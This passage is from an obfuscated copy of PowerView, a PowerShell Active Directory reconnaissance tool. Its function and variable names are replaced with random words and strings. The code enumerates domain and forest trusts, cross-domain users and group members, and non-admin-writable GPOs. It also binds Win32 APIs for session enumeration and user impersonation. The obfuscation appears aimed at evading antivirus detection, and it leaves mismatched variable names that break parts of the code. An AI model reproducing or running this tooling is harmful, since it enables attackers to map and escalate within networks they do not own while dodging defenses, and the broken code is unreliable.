            if (($uBmcbTpF99 -eq 0) -and ($ZdQQYlky99 -gt 0)) {

                $OKZOkhSi99 = $bDvMTOKB99::GetSize()

                for ($i = 0; ($i -lt $VuSjPDrX99); $i++) {
                    $fpakwlHf99 = New-Object System.Intptr -ArgumentList $ZdQQYlky99
                    $Info = $fpakwlHf99 -as $bDvMTOKB99

                    $ZdQQYlky99 = $fpakwlHf99.ToInt64()
                    $ZdQQYlky99 += $OKZOkhSi99

                    $KnFFkPnm99 = ''
                    $uBmcbTpF99 = $CtIsAwlU99::ConvertSidToStringSid($Info.DomainSid, [ref]$KnFFkPnm99);$gFfKoNOj99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($uBmcbTpF99 -eq 0) {
                        Write-Verbose "[chomped] Error: $(([ComponentModel.Win32Exception] $gFfKoNOj99).Message)"
                    }
                    else {
                        $UBALjGPa99 = New-Object PSObject
                        $UBALjGPa99 | Add-Member Noteproperty 'SourceName' $JFMNzrVH99
                        $UBALjGPa99 | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $UBALjGPa99 | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $UBALjGPa99 | Add-Member Noteproperty 'Flags' $Info.Flags
                        $UBALjGPa99 | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $UBALjGPa99 | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $UBALjGPa99 | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $UBALjGPa99 | Add-Member Noteproperty 'TargetSid' $KnFFkPnm99
                        $UBALjGPa99 | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $UBALjGPa99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $UBALjGPa99
                    }
                }
                $Null = $VTuALOfG99::NetApiBufferFree($sTvnYjdq99)
            }
            else {
                Write-Verbose "[chomped] Error: $(([ComponentModel.Win32Exception] $uBmcbTpF99).Message)"
            }
        }
        else {
            $OlJvSeiX99 = foretasted @NetSearcherArguments
            if ($OlJvSeiX99) {
                $OlJvSeiX99.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}


function thump {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $hQLbQXcH99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $MgpzwpCw99 = @{}
        if ($PSBoundParameters['Forest']) { $MgpzwpCw99['Forest'] = $hQLbQXcH99 }
        if ($PSBoundParameters['Credential']) { $MgpzwpCw99['Credential'] = $tYWiEqAT99 }

        $GBOZZMcp99 = muesli @NetForestArguments

        if ($GBOZZMcp99) {
            $GBOZZMcp99.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}


function lingerer {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $kXEJXDlJ99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $nlvvSWoK99 = @{}
        $nlvvSWoK99['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Properties']) { $nlvvSWoK99['Properties'] = $hqDcSuel99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['SecurityMasks']) { $nlvvSWoK99['SecurityMasks'] = $kXEJXDlJ99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
        if ($PSBoundParameters['Raw']) { $nlvvSWoK99['Raw'] = $Raw }
    }

    PROCESS {
        asseverate @SearcherArguments  | ForEach-Object {
            ForEach ($rnszWdCd99 in $_.memberof) {
                $Index = $rnszWdCd99.IndexOf('DC=')
                if ($Index) {

                    $oxZporZB99 = $($rnszWdCd99.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $LsszAuAY99 = $_.distinguishedname
                    $EpHWXXEy99 = $LsszAuAY99.IndexOf('DC=')
                    $thGIxDFy99 = $($_.distinguishedname.SubString($EpHWXXEy99)) -replace 'DC=','' -replace ',','.'

                    if ($oxZporZB99 -ne $thGIxDFy99) {
                        $owBLZLPg99 = $rnszWdCd99.Split(',')[0].split('=')[1]
                        $XKfTnCSG99 = New-Object PSObject
                        $XKfTnCSG99 | Add-Member Noteproperty 'UserDomain' $thGIxDFy99
                        $XKfTnCSG99 | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $XKfTnCSG99 | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $XKfTnCSG99 | Add-Member Noteproperty 'GroupDomain' $oxZporZB99
                        $XKfTnCSG99 | Add-Member Noteproperty 'GroupName' $owBLZLPg99
                        $XKfTnCSG99 | Add-Member Noteproperty 'GroupDistinguishedName' $rnszWdCd99
                        $XKfTnCSG99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $XKfTnCSG99
                    }
                }
            }
        }
    }
}


function cummerbund {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $kXEJXDlJ99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $nlvvSWoK99 = @{}
        $nlvvSWoK99['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Properties']) { $nlvvSWoK99['Properties'] = $hqDcSuel99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['SecurityMasks']) { $nlvvSWoK99['SecurityMasks'] = $kXEJXDlJ99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
        if ($PSBoundParameters['Raw']) { $nlvvSWoK99['Raw'] = $Raw }
    }

    PROCESS {
        $EBmgUbBh99 = @('Users', 'Domain Users', 'Guests')

        walnuts @SearcherArguments | Where-Object { $EBmgUbBh99 -notcontains $_.samaccountname } | ForEach-Object {
            $owBLZLPg99 = $_.samAccountName
            $JBPwwssW99 = $_.distinguishedname
            $oxZporZB99 = $JBPwwssW99.SubString($JBPwwssW99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

            $_.member | ForEach-Object {
                $vChEFBMO99 = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($oxZporZB99 -ne $vChEFBMO99)) {
                    $kaCSJSGP99 = $_
                    $GjUvxgOd99 = $_.Split(',')[0].split('=')[1]

                    $nizcMQdf99 = New-Object PSObject
                    $nizcMQdf99 | Add-Member Noteproperty 'GroupDomain' $oxZporZB99
                    $nizcMQdf99 | Add-Member Noteproperty 'GroupName' $owBLZLPg99
                    $nizcMQdf99 | Add-Member Noteproperty 'GroupDistinguishedName' $JBPwwssW99
                    $nizcMQdf99 | Add-Member Noteproperty 'MemberDomain' $vChEFBMO99
                    $nizcMQdf99 | Add-Member Noteproperty 'MemberName' $GjUvxgOd99
                    $nizcMQdf99 | Add-Member Noteproperty 'MemberDistinguishedName' $kaCSJSGP99
                    $nizcMQdf99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $nizcMQdf99
                }
            }
        }
    }
}


function wrongheadedness {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $adpABMuf99,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    $TiAcgrii99 = @{}

    $IFtQOXaw99 = New-Object System.Collections.Stack

    $yBjpsaDJ99 = @{}
    if ($PSBoundParameters['API']) { $yBjpsaDJ99['API'] = $API }
    if ($PSBoundParameters['NET']) { $yBjpsaDJ99['NET'] = $NET }
    if ($PSBoundParameters['LDAPFilter']) { $yBjpsaDJ99['LDAPFilter'] = $NzjfVMfT99 }
    if ($PSBoundParameters['Properties']) { $yBjpsaDJ99['Properties'] = $hqDcSuel99 }
    if ($PSBoundParameters['SearchBase']) { $yBjpsaDJ99['SearchBase'] = $pQbfmzwr99 }
    if ($PSBoundParameters['Server']) { $yBjpsaDJ99['Server'] = $tqOJuvTN99 }
    if ($PSBoundParameters['SearchScope']) { $yBjpsaDJ99['SearchScope'] = $lGlQEcNF99 }
    if ($PSBoundParameters['ResultPageSize']) { $yBjpsaDJ99['ResultPageSize'] = $ixOvvLXO99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $yBjpsaDJ99['ServerTimeLimit'] = $EQlXfKFO99 }
    if ($PSBoundParameters['Tombstone']) { $yBjpsaDJ99['Tombstone'] = $adpABMuf99 }
    if ($PSBoundParameters['Credential']) { $yBjpsaDJ99['Credential'] = $tYWiEqAT99 }

    if ($PSBoundParameters['Credential']) {
        $zBlGtLAY99 = (foretasted -Credential $tYWiEqAT99).Name
    }
    else {
        $zBlGtLAY99 = (foretasted).Name
    }
    $IFtQOXaw99.Push($zBlGtLAY99)

    while($IFtQOXaw99.Count -ne 0) {

        $JXWXuoyG99 = $IFtQOXaw99.Pop()

        if ($JXWXuoyG99 -and ($JXWXuoyG99.Trim() -ne '') -and (-not $TiAcgrii99.ContainsKey($JXWXuoyG99))) {

            Write-Verbose "[wrongheadedness] Enumerating trusts for domain: '$JXWXuoyG99'"

            $Null = $TiAcgrii99.Add($JXWXuoyG99, '')

            try {
                $yBjpsaDJ99['Domain'] = $JXWXuoyG99
                $ReGtTzxH99 = chomped @DomainTrustArguments

                if ($ReGtTzxH99 -isnot [System.Array]) {
                    $ReGtTzxH99 = @($ReGtTzxH99)
                }

                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $GxyNGkhL99 = @{}
                    if ($PSBoundParameters['Forest']) { $GxyNGkhL99['Forest'] = $hQLbQXcH99 }
                    if ($PSBoundParameters['Credential']) { $GxyNGkhL99['Credential'] = $tYWiEqAT99 }
                    $ReGtTzxH99 += thump @ForestTrustArguments
                }

                if ($ReGtTzxH99) {
                    if ($ReGtTzxH99 -isnot [System.Array]) {
                        $ReGtTzxH99 = @($ReGtTzxH99)
                    }

                    ForEach ($Trust in $ReGtTzxH99) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            $Null = $IFtQOXaw99.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[wrongheadedness] Error: $_"
            }
        }
    }
}


function vortexes {

    [CmdletBinding()]
    Param (
        [String]
        $fGAxBqUK99 = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $UWPrdwer99 = 200
    )

    $WZuIKEmW99 = @('SYSTEM','Domain Admins','Enterprise Admins')

    $hQLbQXcH99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $QQbyCXnp99 = @($hQLbQXcH99.Domains)
    $IFtQOXaw99 = $QQbyCXnp99 | foreach { $_.GetDirectoryEntry() }
    foreach ($JXWXuoyG99 in $IFtQOXaw99) {
        $HLDsNhab99 = "(&(objectCategory=groupPolicyContainer)(displayname=$fGAxBqUK99))"
        $cPmTyRvC99 = New-Object System.DirectoryServices.DirectorySearcher
        $cPmTyRvC99.SearchRoot = $JXWXuoyG99
        $cPmTyRvC99.Filter = $HLDsNhab99
        $cPmTyRvC99.PageSize = $UWPrdwer99
        $cPmTyRvC99.SearchScope = "Subtree"
        $SKHujiFT99 = $cPmTyRvC99.FindAll()
        foreach ($gpo in $SKHujiFT99){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $WZuIKEmW99 -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($ACL -ne $null){
            $BZXnmfGu99 = New-Object psobject
            $BZXnmfGu99 | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
            $BZXnmfGu99 | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $BZXnmfGu99 | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $BZXnmfGu99 | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $BZXnmfGu99
        }
        }
    }
}



$Mod = stimulation -ModuleName Win32


$dDIOSWaI99 = refute $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}

$IqNDhakH99 = refute $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield

$CUtwcuxc99 = refute $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield

$SkxJPteP99 = refute $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

$uLTIZBMd99 = Bloemfontein $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $SkxJPteP99
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}

$xthshAam99 = Bloemfontein $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}

$SkPFhvFy99 = Bloemfontein $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}

$RnTAeUrd99 = Bloemfontein $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}

$eiveVGBF99 = Bloemfontein $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}

$iUTFztWU99 = refute $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}

$nMUiwiWi99 = Bloemfontein $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}

$MuknoUJB99 = Bloemfontein $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $iUTFztWU99
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}

$DsDomainFlag = refute $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$MXwZtseT99 = refute $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$sNTztAlm99 = refute $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}

$bDvMTOKB99 = Bloemfontein $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $MXwZtseT99
    TrustAttributes = field 5 $sNTztAlm99
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}

$QIIICAeE99 = Bloemfontein $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}

$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($QIIICAeE99, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

$Types = $FunctionDefinitions | cocksure -Module $Mod -Namespace 'Win32'
$VTuALOfG99 = $Types['netapi32']
$CtIsAwlU99 = $Types['advapi32']
$loOogVRL99 = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']

